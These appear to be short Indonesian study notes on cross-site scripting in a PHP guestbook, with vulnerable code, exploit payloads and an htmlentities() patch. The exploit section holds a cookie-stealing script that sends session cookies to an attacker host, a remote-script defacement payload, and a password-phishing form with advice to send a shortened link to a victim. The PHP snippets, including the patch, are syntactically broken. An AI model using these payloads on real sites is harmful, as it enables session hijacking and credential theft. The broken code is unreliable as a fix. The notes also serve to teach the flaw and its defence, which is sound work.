VULN

while($row = mysqli_fetch_array($pesan){
  echo "Oleh " . $row['nama'] . " pada tanggal " . $row['tanggal']";
  echo $row['pesan'];
}

EXPLOIT

1. SESSION HIJACKING (XSS STORED)
Halo admin
<script>
  new Image().src = "http://serverhacker:8080/?cookie=" + document.cookie;
</script>
2. DEFACE (XSS STORED)
<script type="text/javascript" src="https://pastebin.com/raw/4zXqdj0T"></script>
3. PHISING (XSS REFLECTED)
url = asd.com/cari?=web<form action="serverhacker"><label>Masukkan password</label><input type="password" name="password"></input><input type="submit" name="submit"></input>
buat shortlink lalu kirim ke victim

PATCH

1. htmlentities()
while($row = mysqli_fetch_array($pesan){
  echo "Oleh " . htmlentities($row['nama']) . " pada tanggal " . htmlentities($row['tanggal'])";
  echo htmlentities($row['pesan']);
}
